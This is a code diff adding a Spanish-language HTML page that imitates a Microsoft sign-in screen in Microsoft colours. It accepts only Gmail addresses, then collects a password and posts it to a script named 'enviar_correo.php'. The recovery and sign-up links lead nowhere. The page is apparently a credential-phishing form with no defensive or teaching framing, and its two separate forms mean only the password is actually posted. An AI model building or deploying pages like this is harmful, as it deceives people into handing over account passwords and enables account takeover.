@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login con Microsoft</title>
+    <style>
+        body {
+            background-image: url('imagen_correo.png'); /* Reemplaza 'imagen_correo.png' con la ruta de tu imagen de fondo */
+            background-size: cover;
+            background-position: center;
+            font-family: Arial, sans-serif;
+            color: #000; /* Color de texto negro */
+            text-align: center;
+            padding-top: 420px; /* Ajusta el espaciado según sea necesario */
+        }
+        .form-section {
+            width: 20%; /* Ancho del 20% */
+            padding: 20px;
+            border-radius: 10px;
+            display: none;
+            background-color: #ffffff; /* Color de fondo del formulario */
+            margin: 0 auto; /* Centra el elemento */
+        }
+        .form-section.active {
+            display: block;
+        }
+        input[type="email"],
+        input[type="password"] {
+            width: calc(110% - 22px);
+            padding: 10px;
+            margin: 5px 0;
+            border-radius: 10px; /* Hacemos el borde más redondeado */
+            border: 1px solid #ccc;
+            box-sizing: border-box;
+        }
+        label {
+            display: none; /* Ocultamos la etiqueta */
+            margin-bottom: 10px;
+        }
+        .long-label {
+            display: inline-block;
+            width: 140px; /* Ajustamos el ancho según sea necesario */
+            text-align: left;
+        }
+        button[type="submit"],
+        .toggle-section {
+            width: calc(35% - 5px); /* Ajustamos el ancho */
+            padding: 10px;
+            margin-top: 10px;
+            border: none;
+            border-radius: 5px;
+            background-color: #0078d4; /* Color azul de Microsoft */
+            color: #fff;
+            cursor: pointer;
+        }
+        button[type="submit"]:hover,
+        .toggle-section:hover {
+            background-color: #005a9e; /* Color azul oscuro de Microsoft */
+        }
+        a {
+            color: #0078d4; /* Color azul de Microsoft para enlaces */
+            text-decoration: none;
+            margin-right: 5px;
+        }
+        .hidden {
+            display: none;
+        }
+        .text-container {
+            margin-top: 10px;
+            line-height: 1.2; /* Altura de línea */
+            height: 40px; /* Altura del contenedor */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+        .text-container p {
+            margin: 0;
+            font-size: 13px; /* Tamaño de la fuente */
+        }
+    </style>
+</head>
+<body>
+    <div id="section-email" class="form-section active">
+        <form action="enviar_correo.php" method="post">
+            <input type="email" id="correo" name="correo" placeholder="Correo electrónico" required><br><br>
+            <button type="button" class="toggle-section" onclick="toggleFormSections('section-password')">Siguiente</button>
+        </form>
+    </div>
+    
+    <div id="section-password" class="form-section">
+        <form action="enviar_correo.php" method="post">
+            <input type="password" id="contrasena" name="contrasena" placeholder="Contraseña" required><br><br>
+            <button type="button" class="toggle-section" onclick="toggleFormSections('section-email')">Volver</button>
+            <button type="submit">Iniciar sesión</button>
+        </form>
+    </div>
+
+    <div class="text-container">
+        <p>¿No puede acceder a su cuenta? <a href="#">Recuperar contraseña</a></p>
+        <p>¿No tiene una cuenta? <a href="#">Cree una.</a></p>
+    </div>
+
+    <script>
+        function toggleFormSections(sectionId) {
+            var email = document.getElementById('correo').value;
+            var sections = document.getElementsByClassName("form-section");
+            if (sectionId === 'section-password') {
+                if (email.endsWith('@gmail.com')) {
+                    document.getElementById('section-email').style.display = 'none';
+                    document.getElementById('section-password').style.display = 'block';
+                    document.getElementById('contrasena').focus();
+                } else {
+                    alert('Por favor, ingrese un correo válido de Gmail para continuar.');
+                }
+            } else {
+                for (var i = 0; i < sections.length; i++) {
+                    sections[i].classList.remove("active");
+                }
+                document.getElementById(sectionId).classList.add("active");
+            }
+        }
+        document.getElementById('section-password').style.display = 'none'; // Oculta la sección de contraseña inicialmente
+    </script>
+</body>
+</html>
